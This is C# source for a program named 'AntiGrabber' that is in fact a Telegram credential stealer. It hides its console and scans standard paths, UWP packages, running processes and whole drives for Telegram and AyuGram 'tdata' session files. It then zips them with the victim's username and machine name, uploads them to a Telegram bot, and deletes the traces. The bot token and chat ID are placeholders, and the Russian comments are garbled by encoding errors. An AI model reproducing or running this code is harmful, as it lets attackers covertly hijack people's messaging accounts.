using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace AntiGrabber
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        private const string BotToken = "–ó–¥–µ—Å—å –±—É–¥–µ—Ç —Ç–æ–∫–µ–Ω –±–æ—Ç–∞";
        private const string ChatId = "–ó–¥–µ—Å—å –±—É–¥–µ—Ç —á–∞—Ç ID";

        private static readonly string[] SessionPrefixes =
        {
            "D877F783D5D3EF8C",
            "A7FDF864FBC10B77",
            "0CA814316818D8F6",
            "C2B05980D9127787"
        };

        private static readonly string[] ProcessNames = { "Telegram", "AyuGram", "Telegram Desktop", "AyuGram Desktop" };

        static async Task Main()
        {
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }

            await SendTelegramMessage("üîç *–ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã...*\n–ò—â—É –∫–ª–∏–µ–Ω—Ç Telegram...");

            try
            {
                List<string> tdataPaths = await FindTdataPaths();

                if (tdataPaths.Count > 0)
                {
                    await SendTelegramMessage($"‚úÖ *–ù–∞–π–¥–µ–Ω–æ –∫–ª–∏–µ–Ω—Ç–æ–≤:* {tdataPaths.Count}");
                    foreach (var tdataPath in tdataPaths)
                    {
                        await SendTelegramMessage($"‚úÖ *–û–±—Ä–∞–±–∞—Ç—ã–≤–∞—é –∫–ª–∏–µ–Ω—Ç!* üìÇ\n–ü—É—Ç—å: `{tdataPath}`\n–ù–∞—á–∏–Ω–∞—é –æ–±—Ä–∞–±–æ—Ç–∫—É...");
                        await ProcessTdataFolder(tdataPath);
                    }
                }
                else
                {
                    await SendTelegramMessage("‚ùå *–ö–ª–∏–µ–Ω—Ç Telegram –Ω–µ –Ω–∞–π–¥–µ–Ω.*");
                }
            }
            catch (Exception ex)
            {
                await SendTelegramMessage($"‚ö† *–û—à–∏–±–∫–∞!* {ex.Message}\nüîç –ü–æ–¥—Ä–æ–±–Ω–æ—Å—Ç–∏: `{ex.StackTrace}`");
            }
        }

        private static async Task<List<string>> FindTdataPaths()
        {
            List<string> foundPaths = new List<string>();

            // 1. –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –ø—É—Ç–µ–π
            await SendTelegramMessage("üîç *–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –ø—É—Ç–µ–π —É—Å—Ç–∞–Ω–æ–≤–∫–∏ Telegram...*");

            // –ü—É—Ç—å –¥–ª—è –¥–µ—Å–∫—Ç–æ–ø–Ω–æ–π –≤–µ—Ä—Å–∏–∏
            string appDataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string telegramDesktopPath = Path.Combine(appDataRoaming, "Telegram Desktop", "tdata");
            await CheckAndAddPath(telegramDesktopPath, foundPaths, "—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –ø—É—Ç—å Desktop");

            // –ü—É—Ç—å –¥–ª—è UWP –≤–µ—Ä—Å–∏–∏ (Windows Store)
            string appDataLocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string packagesPath = Path.Combine(appDataLocal, "Packages");

            if (Directory.Exists(packagesPath))
            {
                await SendTelegramMessage("üîç *–ü—Ä–æ–≤–µ—Ä–∫–∞ UWP –≤–µ—Ä—Å–∏–∏ Telegram...*");
                string[] telegramPackages = Directory.GetDirectories(packagesPath, "TelegramMessengerLLP*");

                foreach (string package in telegramPackages)
                {
                    await SendTelegramMessage($"üîç *–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞–∫–µ—Ç–∞:* `{Path.GetFileName(package)}`");

                    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Å–µ—Ö –≤–æ–∑–º–æ–∂–Ω—ã—Ö –ø—É—Ç–µ–π –≤ UWP –ø–∞–∫–µ—Ç–µ
                    List<string> uwpPathsToCheck = new List<string>
                    {
                        Path.Combine(package, "LocalState", "tdata"),
                        Path.Combine(package, "LocalCache", "Roaming", "Telegram Desktop UWP", "tdata"),
                        Path.Combine(package, "LocalCache", "Roaming", "Telegram Desktop", "tdata"),
                        Path.Combine(package, "LocalCache", "tdata"),
                        Path.Combine(package, "RoamingState", "tdata")
                    };

                    foreach (string pathToCheck in uwpPathsToCheck)
                    {
                        await CheckAndAddPath(pathToCheck, foundPaths, $"UWP –ø—É—Ç—å ({Path.GetDirectoryName(pathToCheck).Replace(package, "...")})");
                    }

                    // –ë–æ–ª–µ–µ –≥–ª—É–±–æ–∫–∏–π –ø–æ–∏—Å–∫ tdata –≤ –ø–∞–∫–µ—Ç–µ UWP
                    await SendTelegramMessage($"üîç *–ì–ª—É–±–æ–∫–∏–π –ø–æ–∏—Å–∫ tdata –≤ –ø–∞–∫–µ—Ç–µ UWP...*");
                    await FindTdataInDirectory(package, foundPaths, 0, 4); // –ü–æ–∏—Å–∫ –≤ –≥–ª—É–±–∏–Ω—É –¥–æ 4 —É—Ä–æ–≤–Ω–µ–π

                    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Å–µ—Å—Å–∏–π –≤ —Ä–∞–∑–Ω—ã—Ö –ø–∞–ø–∫–∞—Ö –ø–∞–∫–µ—Ç–∞ UWP
                    await CheckForSessionFilesInUwpPackage(package, foundPaths);
                }
            }

            // 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
            await SendTelegramMessage("üîç *–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ Telegram...*");
            foreach (string processName in ProcessNames)
            {
                await SendTelegramMessage($"üîç *–ü–æ–∏—Å–∫ –ø—Ä–æ—Ü–µ—Å—Å–∞:* `{processName}`");
                foreach (var process in Process.GetProcessesByName(processName))
                {
                    try
                    {
                        string processPath = process.MainModule?.FileName;
                        if (!string.IsNullOrEmpty(processPath))
                        {
                            string processDir = Path.GetDirectoryName(processPath);
                            string tdataPath = Path.Combine(processDir, "tdata");
                            await CheckAndAddPath(tdataPath, foundPaths, $"–ø—Ä–æ—Ü–µ—Å—Å {processName}");
                        }
                    }
                    catch (Exception ex)
                    {
                        await SendTelegramMessage($"‚ö† *–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø—Ä–æ—Ü–µ—Å—Å—É {processName}:* `{ex.Message}`");
                    }
                }
            }

            // 3. –ü–æ–ª–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ, –µ—Å–ª–∏ –Ω–∏—á–µ–≥–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ
            if (foundPaths.Count == 0)
            {
                await SendTelegramMessage("üîç *–°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –ø—É—Ç–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. –ù–∞—á–∏–Ω–∞—é –ø–æ–ª–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∏—Å–∫–æ–≤...*");
                foreach (DriveInfo drive in DriveInfo.GetDrives().Where(d => d.IsReady && d.DriveType == DriveType.Fixed))
                {
                    try
                    {
                        await SendTelegramMessage($"üîç *–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∏—Å–∫–∞:* `{drive.Name}`");

                        // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏–∑–≤–µ—Å—Ç–Ω—ã–µ –ø—É—Ç–∏ –Ω–∞ –¥–∏—Å–∫–µ
                        string usersFolder = Path.Combine(drive.RootDirectory.FullName, "Users");
                        if (Directory.Exists(usersFolder))
                        {
                            foreach (var userDir in Directory.GetDirectories(usersFolder))
                            {
                                string appDataPath = Path.Combine(userDir, "AppData", "Roaming", "Telegram Desktop", "tdata");
                                await CheckAndAddPath(appDataPath, foundPaths, $"–ø—É—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {Path.GetFileName(userDir)}");
                            }
                        }

                        // –ò—â–µ–º tdata –Ω–∞–ø—Ä—è–º—É—é
                        string[] tdataFolders = Directory.GetDirectories(drive.RootDirectory.FullName, "tdata", SearchOption.AllDirectories);
                        foreach (string folder in tdataFolders)
                        {
                            await CheckAndAddPath(folder, foundPaths, "–Ω–∞–π–¥–µ–Ω–æ –ø—Ä–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–∏");
                        }

                        // –ò—â–µ–º –ø–∞–ø–∫–∏ —Å prefixes
                        await SendTelegramMessage($"üîç *–ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤ —Å–µ—Å—Å–∏–∏ –Ω–∞ –¥–∏—Å–∫–µ:* `{drive.Name}`");
                        await ScanForSessionFiles(drive.RootDirectory.FullName, foundPaths);
                    }
                    catch (Exception ex)
                    {
                        await SendTelegramMessage($"‚ö† *–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –¥–∏—Å–∫–∞ {drive.Name}:* `{ex.Message}`");
                    }
                }
            }

            return foundPaths.Distinct().ToList();
        }

        private static async Task FindTdataInDirectory(string dirPath, List<string> foundPaths, int currentDepth, int maxDepth)
        {
            if (currentDepth >= maxDepth)
                return;

            try
            {
                foreach (string subDir in Directory.GetDirectories(dirPath))
                {
                    try
                    {
                        if (Path.GetFileName(subDir).Equals("tdata", StringComparison.OrdinalIgnoreCase))
                        {
                            await CheckAndAddPath(subDir, foundPaths, $"UWP –≥–ª—É–±–æ–∫–∏–π –ø–æ–∏—Å–∫: {subDir.Replace(dirPath, "...")}");
                        }
                        else
                        {
                            await FindTdataInDirectory(subDir, foundPaths, currentDepth + 1, maxDepth);
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–∞–ø–∫–∏ –±–µ–∑ –¥–æ—Å—Ç—É–ø–∞
                    }
                }
            }
            catch
            {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏
            }
        }

        private static async Task CheckForSessionFilesInUwpPackage(string packagePath, List<string> foundPaths)
        {
            List<string> foldersToCheck = new List<string>
            {
                Path.Combine(packagePath, "LocalState"),
                Path.Combine(packagePath, "LocalCache"),
                Path.Combine(packagePath, "RoamingState")
            };

            foreach (string folder in foldersToCheck)
            {
                if (Directory.Exists(folder))
                {
                    await CheckFolderAndSubfoldersForSessions(folder, foundPaths, 0, 3);
                }
            }
        }

        private static async Task CheckFolderAndSubfoldersForSessions(string folderPath, List<string> foundPaths, int currentDepth, int maxDepth)
        {
            if (currentDepth >= maxDepth)
                return;

            try
            {
                if (HasSessionFiles(folderPath))
                {
                    foundPaths.Add(folderPath);
                    await SendTelegramMessage($"‚úÖ *–ù–∞–π–¥–µ–Ω—ã —Ñ–∞–π–ª—ã —Å–µ—Å—Å–∏–∏ –≤ UWP:* `{folderPath}`");
                    return; // –ù–µ –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º –ø–æ–∏—Å–∫ –≤ –ø–æ–¥–ø–∞–ø–∫–∞—Ö, –µ—Å–ª–∏ –Ω–∞—à–ª–∏ —Å–µ—Å—Å–∏—é –≤ —Ç–µ–∫—É—â–µ–π –ø–∞–ø–∫–µ
                }

                foreach (string subDir in Directory.GetDirectories(folderPath))
                {
                    try
                    {
                        await CheckFolderAndSubfoldersForSessions(subDir, foundPaths, currentDepth + 1, maxDepth);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–∞–ø–∫–∏ –±–µ–∑ –¥–æ—Å—Ç—É–ø–∞
                    }
                }
            }
            catch
            {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏
            }
        }

        private static async Task CheckAndAddPath(string path, List<string> foundPaths, string source)
        {
            if (Directory.Exists(path))
            {
                foundPaths.Add(path);
                await SendTelegramMessage($"‚úÖ *–ù–∞–π–¥–µ–Ω–∞ tdata* ({source}):\n`{path}`");
            }
            else
            {
                await SendTelegramMessage($"‚ùå *–ù–µ –Ω–∞–π–¥–µ–Ω–æ* ({source}):\n`{path}`");
            }
        }

        private static bool HasSessionFiles(string folderPath)
        {
            try
            {
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —Ñ–∞–π–ª–æ–≤ —Å–µ—Å—Å–∏–∏
                foreach (string prefix in SessionPrefixes)
                {
                    if (Directory.GetFiles(folderPath, prefix + "*").Length > 0)
                    {
                        return true;
                    }

                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –ø–æ–¥–ø–∞–ø–æ–∫ —Å –ø—Ä–µ—Ñ–∏–∫—Å–∞–º–∏
                    string subFolder = Path.Combine(folderPath, prefix);
                    if (Directory.Exists(subFolder))
                    {
                        return true;
                    }
                }

                // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ key_datas
                if (File.Exists(Path.Combine(folderPath, "key_datas")))
                {
                    return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        private static async Task ScanForSessionFiles(string rootPath, List<string> foundPaths)
        {
            try
            {
                foreach (string dir in Directory.GetDirectories(rootPath))
                {
                    try
                    {
                        if (HasSessionFiles(dir))
                        {
                            foundPaths.Add(dir);
                            await SendTelegramMessage($"‚úÖ *–ù–∞–π–¥–µ–Ω—ã —Ñ–∞–π–ª—ã —Å–µ—Å—Å–∏–∏:* `{dir}`");
                        }

                        // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –≥–ª—É–±–∏–Ω—É —Ä–µ–∫—É—Ä—Å–∏–∏ –¥–ª—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏
                        string[] pathParts = dir.Split(Path.DirectorySeparatorChar);
                        if (pathParts.Length < 5) // –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≥–ª—É–±–∏–Ω—ã —Ä–µ–∫—É—Ä—Å–∏–∏
                        {
                            await ScanForSessionFiles(dir, foundPaths);
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–∞–ø–∫–∏ –±–µ–∑ –¥–æ—Å—Ç—É–ø–∞
                    }
                    catch (Exception ex)
                    {
                        await SendTelegramMessage($"‚ö† *–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è* `{dir}`: `{ex.Message}`");
                    }
                }
            }
            catch
            {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –Ω–∞ –≤–µ—Ä—Ö–Ω–µ–º —É—Ä–æ–≤–Ω–µ
            }
        }

        private static async Task ProcessTdataFolder(string tdataPath)
        {
            try
            {
                string clientName = Path.GetFileName(Path.GetDirectoryName(tdataPath));
                if (clientName == "tdata") // –ï—Å–ª–∏ —Å–∞–º–∞ –ø–∞–ø–∫–∞ tdata
                {
                    clientName = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(tdataPath)));
                }

                // –°–æ–∑–¥–∞–µ–º —É–Ω–∏–∫–∞–ª—å–Ω–æ–µ –∏–º—è –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞, –µ—Å–ª–∏ –ø—É—Ç—å —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π –∏–ª–∏ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π
                if (string.IsNullOrWhiteSpace(clientName) || clientName.Length > 30)
                {
                    clientName = "Telegram-" + Guid.NewGuid().ToString().Substring(0, 8);
                }

                string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
                string tdataArchiveDir = Path.Combine(tempDir, "tdata");
                Directory.CreateDirectory(tdataArchiveDir);

                await SendTelegramMessage($"üìÇ *–û–±—Ä–∞–±–∞—Ç—ã–≤–∞—é tdata –∫–ª–∏–µ–Ω—Ç–∞ {clientName}...*\n–ö–æ–ø–∏—Ä—É—é —Ñ–∞–π–ª—ã...");

                // –ö–æ–ø–∏—Ä—É–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ —Ñ–∞–π–ª—ã —Å–µ—Å—Å–∏–∏
                int filesCopied = 0;
                foreach (string file in Directory.GetFiles(tdataPath))
                {
                    string fileName = Path.GetFileName(file);
                    if (SessionPrefixes.Any(prefix => fileName.StartsWith(prefix)) || fileName == "key_datas")
                    {
                        string destPath = Path.Combine(tdataArchiveDir, fileName);
                        File.Copy(file, destPath, true);
                        filesCopied++;

                        if (filesCopied % 5 == 0 || fileName == "key_datas")
                        {
                            await SendTelegramMessage($"üìÑ *–§–∞–π–ª –¥–æ–±–∞–≤–ª–µ–Ω:* `{fileName}`");
                        }
                    }
                }

                // –ö–æ–ø–∏—Ä—É–µ–º —Ñ–∞–π–ª—ã –∏–∑ –ø–æ–¥–ø–∞–ø–æ–∫ —Å –ø—Ä–µ—Ñ–∏–∫—Å–∞–º–∏
                foreach (string prefix in SessionPrefixes)
                {
                    string subFolderPath = Path.Combine(tdataPath, prefix);
                    if (Directory.Exists(subFolderPath))
                    {
                        string subArchiveDir = Path.Combine(tdataArchiveDir, prefix);
                        Directory.CreateDirectory(subArchiveDir);

                        foreach (string file in Directory.GetFiles(subFolderPath))
                        {
                            string fileName = Path.GetFileName(file);
                            if (fileName.StartsWith("map") || fileName.StartsWith("config"))
                            {
                                string destPath = Path.Combine(subArchiveDir, fileName);
                                File.Copy(file, destPath, true);
                                await SendTelegramMessage($"üìÑ *–§–∞–π–ª –¥–æ–±–∞–≤–ª–µ–Ω:* `{fileName}` (–∏–∑ –ø–∞–ø–∫–∏ {prefix})");
                            }
                        }
                    }
                }

                await SendTelegramMessage($"üì¶ *–°–æ–∑–¥–∞–Ω–∏–µ –∞—Ä—Ö–∏–≤–∞ –∫–ª–∏–µ–Ω—Ç–∞ {clientName}...*");
                string archivePath = Path.Combine(Path.GetTempPath(), $"{clientName}-{DateTime.Now:yyyyMMdd-HHmmss}.zip");
                if (File.Exists(archivePath)) File.Delete(archivePath);
                ZipFile.CreateFromDirectory(tempDir, archivePath);

                await SendTelegramMessage("üì¶ *–ê—Ä—Ö–∏–≤ —Å–æ–∑–¥–∞–Ω!*\n–û—Ç–ø—Ä–∞–≤–ª—è—é...");

                await SendTelegramFileWithMessage(archivePath, $"üì¶ *–ê—Ä—Ö–∏–≤ Telegram*\nüóÇ –ö–ª–∏–µ–Ω—Ç: {clientName}\nüìÇ –ü—É—Ç—å: `{tdataPath}`\nüïí {DateTime.Now}\nüë§ {Environment.UserName}\nüíª {Environment.MachineName}");

                // –û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
                await SendTelegramMessage("üßπ *–£–¥–∞–ª–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤...*");
                File.Delete(archivePath);
                Directory.Delete(tempDir, true);
                await SendTelegramMessage("‚úÖ *–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!*");
            }
            catch (Exception ex)
            {
                await SendTelegramMessage($"‚ö† *–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏!* {ex.Message}\nüîç –ü–æ–¥—Ä–æ–±–Ω–æ—Å—Ç–∏: `{ex.StackTrace}`");
            }
        }

        private static async Task SendTelegramMessage(string message)
        {
            using (var client = new HttpClient())
            {
                string url = $"https://api.telegram.org/bot{BotToken}/sendMessage";
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("chat_id", ChatId),
                    new KeyValuePair<string, string>("text", message),
                    new KeyValuePair<string, string>("parse_mode", "Markdown")
                });
                await client.PostAsync(url, content);
            }
        }

        private static async Task SendTelegramFileWithMessage(string filePath, string message)
        {
            using (var client = new HttpClient())
            {
                string url = $"https://api.telegram.org/bot{BotToken}/sendDocument";
                var multipartContent = new MultipartFormDataContent
                {
                    { new StringContent(ChatId), "chat_id" },
                    { new StringContent(message), "caption" },
                    { new StringContent("Markdown"), "parse_mode" }
                };

                var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath))
                {
                    Headers = { ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip") }
                };

                multipartContent.Add(fileContent, "document", Path.GetFileName(filePath));
                await client.PostAsync(url, multipartContent);
            }
        }
    }
}
